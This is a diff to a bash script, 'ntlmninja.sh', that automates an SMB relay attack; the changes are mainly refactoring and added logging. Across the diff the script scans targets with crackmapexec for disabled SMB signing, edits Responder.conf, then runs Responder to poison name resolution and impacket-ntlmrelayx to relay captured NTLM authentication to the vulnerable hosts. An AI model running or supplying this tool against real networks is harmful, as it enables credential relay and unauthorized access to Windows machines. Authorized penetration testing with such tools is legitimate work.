@@ -3,7 +3,7 @@
 # =============================================================
 # ntlmninja.sh - SMB Relay Attack Automation Script
 # -------------------------------------------------------------
-# This script automates the setup and execution of an SMB relay
+# This script automates the setup and execution of a SMB relay
 # attack using tools like Responder, Impacket's ntlmrelayx,
 # crackmapexec, and tmux. It scans a list of target IPs for
 # misconfigured SMB signing, and if vulnerabilities are found,
@@ -25,31 +25,43 @@ YELLOW='\033[0;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
-# Network interface (configurable)
-network_interface="eth0"
+# Network interface (dynamically detected by default)
+network_interface="$(ip route | awk '/default/ {print $5; exit}')"
+
+# Log file
+log_file="smb_relay_attack.log"
+exec > >(tee -a "$log_file") 2>&1
 
 # Print help
 print_help() {
-    echo -e "${BLUE}Usage: $0 [-f TARGET_FILE] [-h]${NC}"
-    echo -e "  ${YELLOW}-f TARGET_FILE${NC}   The file containing all targets to scan for misconfigured smb signing."
-    echo -e "  ${YELLOW}-h${NC}               Display this help and exit"
+    echo -e "${BLUE}Usage: $0 [-f TARGET_FILE] [-i NETWORK_INTERFACE] [-h]${NC}"
+    echo -e "  ${YELLOW}-f TARGET_FILE${NC}   File containing target IPs to scan for misconfigured SMB signing."
+    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${NC} Specify network interface (default: ${network_interface})."
+    echo -e "  ${YELLOW}-h${NC}               Display this help and exit."
 }
 
 # Check if a tool is installed
 check_tool() {
     echo -e "[*] Checking ${YELLOW}$1${NC} if installed..."
-    if ! which $1 >/dev/null; then
-        echo -e "${RED}[!] $1 is not installed. Please install it and try again.${NC}"
+    command -v "$1" > /dev/null 2>&1 || {
+        echo -e "${RED}[!] $1 is not installed. Please install it first. Exiting.${NC}"
+        exit 1
+    }
+}
+
+# Validate network interface
+validate_network_interface() {
+    if ! ip link show "$network_interface" > /dev/null 2>&1; then
+        echo -e "${RED}[!] Network interface ${network_interface} not found. Exiting.${NC}"
         exit 1
     fi
 }
 
 # Run crackmapexec
 run_crackmapexec() {
-    # Check if the target list for SMB Relay already exists
     if [[ ! -f "${TARGET_SMB_FILE}" ]]; then
-        echo -e "[*] ${BLUE}Commence checking on targets with misconfigured smb signing${NC}"
-        echo -e "[*] ${GREEN}Generating list of misconfigured smb signing targets in this output file ${TARGET_SMB_FILE}${NC} via crackmapexec..."
+        echo -e "[*] ${BLUE}Scanning for misconfigured SMB signing on targets...${NC}"
+        echo -e "[*] ${GREEN}Generating list of vulnerable targets in ${TARGET_SMB_FILE}.${NC}"
         crackmapexec smb --gen-relay-list "${TARGET_SMB_FILE}" "${TARGET_FILE}" | grep "signing:False" | while read -r line; do
             echo -e "${YELLOW}[!] Misconfigured target: ${line}${NC}"
             echo "$line" >> "${TARGET_SMB_FILE}"
@@ -59,20 +71,17 @@ run_crackmapexec() {
 
 # Edit Responder.conf file
 edit_responder_conf() {
-    if [ -f "${responder_config_file}" ]; then
+if [ -f "${responder_config_file}" ]; then
         if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
-            echo -e "[*] ${GREEN}Responder.conf already has SMB and HTTP settings set to 'Off'.${NC}"
-            return
+            echo -e "[*] ${GREEN}Responder.conf already configured with SMB and HTTP set to 'Off'.${NC}"
         else
-            echo -e "[*] ${YELLOW}Turning off SMB and HTTP on Responder.conf...${NC}"
-            sudo sed -i 's/^SMB = .*/SMB = /' "${responder_config_file}"
-            sudo sed -i "/^SMB =/ s/$/Off/" "${responder_config_file}"
-            sudo sed -i 's/^HTTP = .*/HTTP = /' "${responder_config_file}"
-            sudo sed -i "/^HTTP =/ s/$/Off/" "${responder_config_file}"
-            echo -e "[+] ${GREEN}Turned off SMB and HTTP successfully.${NC}"
+            echo -e "[*] ${YELLOW}Updating Responder.conf to turn off SMB and HTTP...${NC}"
+            sudo sed -i 's/^SMB = .*/SMB = Off/' "${responder_config_file}"
+            sudo sed -i 's/^HTTP = .*/HTTP = Off/' "${responder_config_file}"
+            echo -e "[+] ${GREEN}Responder.conf updated successfully.${NC}"
         fi
     else
-        echo -e "${RED}[!] Responder.conf file not found. Please make sure Responder is installed and configured properly.${NC}"
+        echo -e "${RED}[!] Responder.conf file not found. Please ensure Responder is installed and configured properly.${NC}"
         exit 1
     fi
 }
@@ -80,23 +89,17 @@ edit_responder_conf() {
 # Run SMB Relay Attack
 run_smb_relay_attack() {
     echo -e "[*] ${BLUE}Starting SMB Relay Attack...${NC}"
-    # create tmux session
-    echo -e "[+] ${GREEN}Creating session named ${session_name}...${NC}"
     tmux new-session -d -s $session_name
-    # add responder window
-    echo -e "[+] ${GREEN}Creating window named ${window1}...${NC}"
+    echo -e "[+] ${GREEN}Creating tmux session named ${session_name}.${NC}"
+    
     tmux rename-window $window1
-    echo -e "[*] ${YELLOW}Running responder on window ${window1}...${NC}"
-    # run the responder
+    echo -e "[+] ${GREEN}Starting Responder in window ${window1}.${NC}"
     tmux send-keys "responder -I ${network_interface}" C-m
-    # add ntlmrelayx window
-    echo -e "[+] ${GREEN}Creating window named ${window2}...${NC}"
-    tmux new-window
-    tmux rename-window $window2
-    # run the ntlmrelayx
-    echo -e "[*] ${YELLOW}Running Impacket's ntlmrelayx on window ${window2}...${NC}"
+
+    tmux new-window -n $window2
+    echo -e "[+] ${GREEN}Starting ntlmrelayx in window ${window2}.${NC}"
     tmux send-keys "impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" C-m
-    # attach tmux session
+
     tmux -CC attach-session -t $session_name
 }
 
@@ -134,12 +137,16 @@ else
         echo -e "${RED}[!] Usage: ./$0 [-f TARGET_FILE] [-i NETWORK_INTERFACE]${NC}"
         exit 1
     fi
+    
+    validate_network_interface
     # Check if required tools are installed
     check_tool "tmux"
     check_tool "responder"
     check_tool "impacket-ntlmrelayx"
     check_tool "crackmapexec"
+    
     run_crackmapexec
+    
     if [ -s "${TARGET_SMB_FILE}" ]; then
         edit_responder_conf
         sleep 2
